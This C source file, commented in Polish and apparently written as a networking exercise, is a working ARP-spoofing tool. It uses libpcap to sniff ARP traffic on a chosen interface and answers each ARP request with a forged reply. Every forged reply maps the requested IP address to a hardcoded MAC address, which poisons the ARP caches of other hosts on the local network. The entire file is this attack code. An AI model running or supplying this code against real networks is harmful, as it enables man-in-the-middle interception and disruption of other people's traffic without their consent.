/*
 * arp_spoof.c
 *
 *  Created on: 9 cze 2018
 *      Author: root
 */

#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
//#include "headers.h"

#include <netinet/ether.h> /* ether_ntoa() */
/*
 * <netinet/ether.h> zalacza naglowek <netinet/if_ether.h> (struct ether_arp).
 * Z kolei naglowek <netinet/if_ether.h> zalacza:
 * <net/if_arp.h> (struct arphdr, ARP protocol opcodes, ARP hardware ID's)
 * <net/ethernet.h> (struct ether_header, struct ether_addr,
 * Ethernet protocol ID's)
 */

#include <netinet/in.h> /* IP protocols (IPPROTO_ICMP) */
#include <arpa/inet.h> /* inet_ntop() */
#include <errno.h>

/* Deskryptor wykorzystywany do przechwytywania pakietow: */
pcap_t                  *descriptor;

void spoof(struct ether_arp *arp_header, struct ether_header *ether_header);

void callback(u_char *arg, const struct pcap_pkthdr *pkt_header, const u_char *packet) {

    /* Adres IPv4: */
    char                    address[INET_ADDRSTRLEN];

    /* Wskaznik na pierwszy bajt naglowka ARP: */
    struct ether_arp        *arp_header;

    /* Wskaznik na pierwszy bajt naglowka ramki Ethernet: */
    struct ether_header     *ether_header;

    /*
     * Jezeli rozmiar jest mniejszy od:
     * rozmiar naglowka ramki Ethernet
     * + rozmiar naglowka ARP (28  bajtow)
     */
    if (pkt_header->caplen < ETHER_HDR_LEN + 28) {
        fprintf(stderr, "Packet length < ETHER_HDR_LEN + 28\n");
        return;
    }

    ether_header = (struct ether_header*)packet;

    /* Jezeli ramka nie przenosi naglowka ARP: */
    if (ntohs(ether_header->ether_type) != ETHERTYPE_ARP) {
        return;
    }

    /* Wskaznik na pierwszy bajt naglowka ARP: */
    arp_header = (struct ether_arp*)((unsigned char*)packet + ETHER_HDR_LEN);

    /* Interesuja nas tylko naglowki ARP dla Ethernetu i IP: */
    if (ntohs(arp_header->arp_hrd) != ARPHRD_ETHER
            && ntohs(arp_header->arp_pro) != ETHERTYPE_IP) {
        return;
    }

    fprintf(stdout, "ARP ");
    switch (ntohs(arp_header->arp_op)) {
    case ARPOP_REQUEST:
        fprintf(stdout, "REQUEST");
        spoof(arp_header, ether_header);
        break;
    case ARPOP_REPLY:
        fprintf(stdout, "REPLY");
        break;
    default:
        return;
    }

    fprintf(stdout, "\n");
    fprintf(stdout, "Sender MAC: %s, ",
            ether_ntoa((struct ether_addr*)arp_header->arp_sha));
    fprintf(stdout, "Sender IP: %s\n",
            inet_ntop(AF_INET, arp_header->arp_spa, address, INET_ADDRSTRLEN));

    fprintf(stdout, "Target MAC: %s, ",
            ether_ntoa((struct ether_addr*)arp_header->arp_tha));
    fprintf(stdout, "Target IP: %s\n\n",
            inet_ntop(AF_INET, arp_header->arp_tpa, address, INET_ADDRSTRLEN));

}


int main(int argc, char **argv) {

    char                    errbuf[PCAP_ERRBUF_SIZE];

    /* Typ warstwy lacza danych: */
    int                     data_link_type;

    /* Program filtrujacy: */
    struct bpf_program      fp;

    if (argc != 2) {
        fprintf(stderr, "Invocation: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    /* Utworzenie deskryptora do przechwytywania pakietow: */
    descriptor = pcap_open_live(argv[1], 65565, 0, 10, errbuf);
    if (descriptor == NULL) {
        fprintf(stderr, "pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    /* Sprawdzenie typu warstwy lacza danych: */
    data_link_type = pcap_datalink(descriptor);
    if (data_link_type != DLT_EN10MB) {
        /* Jezeli inny od ETHERNET: */
        exit(EXIT_FAILURE);
    }

    /*
     * Przeksztalcenie tekstowej formy filtru w program filtrujacy "fp".
     * Filtr pozwala na przechwytywanie tylko pakietow ARP:
     */
    if (pcap_compile(descriptor, &fp, "arp", 1, 0) == -1) {
        pcap_perror(descriptor, "pcap_compile()");
        exit(EXIT_FAILURE);
    }

    /* Zdefiniowanie programu filtrujacego dla deskryptora: */
    if (pcap_setfilter(descriptor, &fp) == -1) {
        pcap_perror(descriptor, "pcap_setfilter()");
        exit(EXIT_FAILURE);
    }

    /* Po wywolaniu pcap_setfilter() mozna zwolnic pamiec programu filtrujacego: */
    pcap_freecode(&fp);

    if (pcap_loop(descriptor, -1, callback, NULL) == -1) {
        pcap_perror(descriptor, "pcap_loop()");
        exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
}

void spoof(struct ether_arp *arp_header, struct ether_header *ether_header)
{
	u_char packet[ETHER_HDR_LEN + sizeof(struct ether_arp)];

	struct ether_header new_ether_header;
	struct ether_arp new_arp_header;

	char src_mac[INET6_ADDRSTRLEN] ="8:0:27:19:64:ae";
	struct ether_addr *ethaddr = NULL;
	ethaddr = ether_aton(src_mac);
	memcpy(new_ether_header.ether_shost, ethaddr, 6);

	memcpy(new_ether_header.ether_dhost, ether_header->ether_shost, 6);

	new_ether_header.ether_type = htons(ETHERTYPE_ARP);

	//źródłowy adres MAC jest adresem interfejsu, na którym przechwytywane są pakiety
	memcpy(new_arp_header.arp_sha, ethaddr, 6);


	//źródłowy adres IP jest docelowym adresem IP z pakietu ARP REQUEST
	memcpy(new_arp_header.arp_spa, arp_header->arp_tpa, 4);

	//docelowy adres MAC jest źródłowym adresem MAC z pakietu ARP REQUEST
	memcpy(new_arp_header.arp_tha, arp_header->arp_sha, 6);

	//docelowy adres IP jest źródłowym adresem IP z pakietu ARP REQUEST
	memcpy(new_arp_header.arp_tpa, arp_header->arp_spa, 4);


	//opcode odpowiedz arp
	new_arp_header.ea_hdr.ar_hln = arp_header->ea_hdr.ar_hln;
	new_arp_header.ea_hdr.ar_hrd = arp_header->ea_hdr.ar_hrd;
	new_arp_header.ea_hdr.ar_pln = arp_header->ea_hdr.ar_pln;
	new_arp_header.ea_hdr.ar_pro = arp_header->ea_hdr.ar_pro;
	new_arp_header.ea_hdr.ar_op = htons(ARPOP_REPLY);

	memcpy(packet, &new_ether_header, sizeof(new_ether_header));
	memcpy(packet + sizeof(new_ether_header), &new_arp_header, sizeof(new_arp_header));

	if(pcap_sendpacket(descriptor, packet, sizeof(packet))==-1)
	{
		printf("blad: %s\n", pcap_geterr(descriptor));
	}

	printf("\nModified packed sent\n");

}
